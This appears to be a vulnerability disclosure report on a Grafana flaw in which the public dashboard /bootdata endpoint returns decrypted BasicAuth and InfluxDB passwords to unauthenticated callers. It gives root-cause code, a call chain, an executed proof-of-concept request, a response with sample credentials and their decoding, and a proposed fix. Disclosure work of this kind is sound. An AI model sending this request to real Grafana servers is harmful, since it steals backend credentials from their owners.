# H3 — Public Dashboard DS_ACCESS_DIRECT Exposes Decrypted Credentials

**ID**: H3  
**Severity**: HIGH  
**Status**: Confirmed — PoC Executed  
**PoC-Status**: executed  
**Affected versions**: Grafana OSS/Enterprise through 13.1.0-pre (current HEAD); confirmed on 12.4.2  
**Component**: `pkg/api/frontendsettings.go:541-577`  
**Endpoint**: `GET /bootdata/:accessToken`  
**CVE context**: Residual gap in CVE-2026-27877 patch (commit 468a14d)

---

## Summary

Any internet user who knows a public dashboard access token can call
`GET /bootdata/:accessToken` with zero authentication and receive decrypted
datasource credentials — including BasicAuth username:password (base64-encoded)
and plaintext InfluxDB passwords — in the JSON response.

The token is shown in the public dashboard share URL and is therefore available
to every user who visits the shared link.

---

## Vulnerability Details

### Root Cause

`getFSDataSources` (`frontendsettings.go:464`) has an `IsPublicDashboardView()`
branch that restricts which datasources are returned for public callers, but
provides **no guard** around the credential extraction block that follows:

```go
// frontendsettings.go:476-483 — filters which datasources appear (correct)
if c.IsPublicDashboardView() {
    filtered, err := hs.publicDashFilterUsedDataSources(c, dataSources)
    ...
    orgDataSources = filtered
}

// frontendsettings.go:541-577 — credential extraction for ALL remaining datasources
// NO IsPublicDashboardView() check here
if ds.Access == datasources.DS_ACCESS_DIRECT {
    if ds.BasicAuth {
        password, _ := hs.DataSourcesService.DecryptedBasicAuthPassword(c.Req.Context(), ds)
        dsDTO.BasicAuth = util.GetBasicAuthHeader(ds.BasicAuthUser, password)  // base64 user:pass
    }
    if ds.Type == datasources.DS_INFLUXDB {
        password, _ := hs.DataSourcesService.DecryptedPassword(c.Req.Context(), ds)
        dsDTO.Password = password  // plaintext credential
    }
}
```

The CVE-2026-27877 fix (commit 468a14d, Feb 2026) added `publicDashFilterUsedDataSources`
to limit which datasources pass through for public callers — but the credential fields
for datasources that survive the filter are still populated without restriction.

### Call Chain

```
GET /bootdata/:accessToken            (no auth; unauthenticated viewer)
  SetPublicDashboardAccessToken        c.PublicDashboardAccessToken = token
  SetPublicDashboardOrgIdOnContext     c.OrgID = org from DB
  GetBootdata
    setIndexViewData
      getFrontendSettings
        getFSDataSources
          publicDashFilterUsedDataSources  <- filters list (CVE fix)
          loop over orgDataSources
            if ds.Access == DS_ACCESS_DIRECT {  <- NO public guard
              dsDTO.BasicAuth = decrypted creds  <- LEAKED
              dsDTO.Password  = decrypted creds  <- LEAKED
            }
          return datasources map
      -> JSON response includes credentials
```

---

## Reproduction (Executed)

**Environment**: `grafana/grafana:latest` (12.4.2), Docker, macOS arm64

### Steps

1. Admin creates datasource with `access: direct`, `basicAuth: true`, and encrypted credentials.
2. Admin creates a dashboard using that datasource and enables public sharing.
3. Admin shares the URL — access token is embedded in the share URL.
4. Attacker (unauthenticated) calls the bootdata endpoint with the token.

### Attacker Request

```
GET /bootdata/875a839bbdaf43608cc8d9e68f583a9b HTTP/1.1
Host: grafana.example.com
```

No `Authorization` header, no session cookie.

### Observed Response (abbreviated)

```json
{
  "settings": {
    "datasources": {
      "h3-poc-influx-direct": {
        "access":    "direct",
        "url":       "http://influxdb.internal:8086",
        "basicAuth": "Basic YmFzaWNhdXRoX3VzZXI6UzNjcjN0QjRzMWNQNHNzIQ==",
        "username":  "influx_ro_user",
        "password":  "Infl0xPl4intextP4ss!"
      }
    }
  }
}
```

### Credential Extraction

```
basicAuth decoded : basicauth_user:S3cr3tB4s1cP4ss!   <-- user:pass EXPOSED
InfluxDB password : Infl0xPl4intextP4ss!              <-- PLAINTEXT EXPOSED
```

Full exploit output: `evidence/exploit.log`  
Full bootdata response: `evidence/bootdata_response.json`

---

## Impact

| Impact dimension | Detail |
|---|---|
| Confidentiality | Decrypted datasource credentials returned to any unauthenticated caller |
| Credential types | HTTP BasicAuth (username:password), InfluxDB plaintext password |
| Attacker requirement | Public dashboard access token (visible in share URL) |
| Post-exploit access | Direct access to backend data store, bypassing Grafana |
| Lateral movement | Backend credentials may grant access to production databases or monitoring infra |

The attacker receives the datasource URL alongside its credentials, giving them
everything needed to connect to the backend service directly.

---

## Affected Datasource Types

Any datasource configured with `access: direct` and either:
- `basicAuth: true` — exposes `BasicAuth` header (base64 `user:password`)
- type `influxdb` or `influxdb_08` — exposes plaintext `password` field

Common configurations: Prometheus with basic auth (if set to direct), InfluxDB,
any HTTP datasource with BasicAuth enabled.

---

## Fix

Add an `IsPublicDashboardView()` guard around the credential extraction block:

```go
// frontendsettings.go:541
if ds.Access == datasources.DS_ACCESS_DIRECT {
    if !c.IsPublicDashboardView() {  // ADD THIS GUARD
        if ds.BasicAuth {
            password, err := hs.DataSourcesService.DecryptedBasicAuthPassword(...)
            dsDTO.BasicAuth = util.GetBasicAuthHeader(ds.BasicAuthUser, password)
        }
        if ds.Type == datasources.DS_INFLUXDB || ds.Type == datasources.DS_INFLUXDB_08 {
            password, err := hs.DataSourcesService.DecryptedPassword(...)
            dsDTO.Password = password
        }
    }
}
```

Alternatively, strip `basicAuth` and `password` fields from the DTO after
construction when `c.IsPublicDashboardView()` is true.

---

## Evidence Files

| File | Description |
|---|---|
| `evidence/setup.sh` | Container provisioning |
| `evidence/setup.log` | Provisioning output |
| `evidence/healthcheck.log` | Grafana health check |
| `evidence/exploit.log` | Full PoC execution output |
| `evidence/bootdata_response.json` | Raw JSON returned to unauthenticated caller |
| `evidence/impact.log` | Extracted credentials and impact narrative |
| `evidence/env-info.txt` | Docker/OS environment details |
| `poc.sh` | Self-contained exploit (provisions + exploits) |
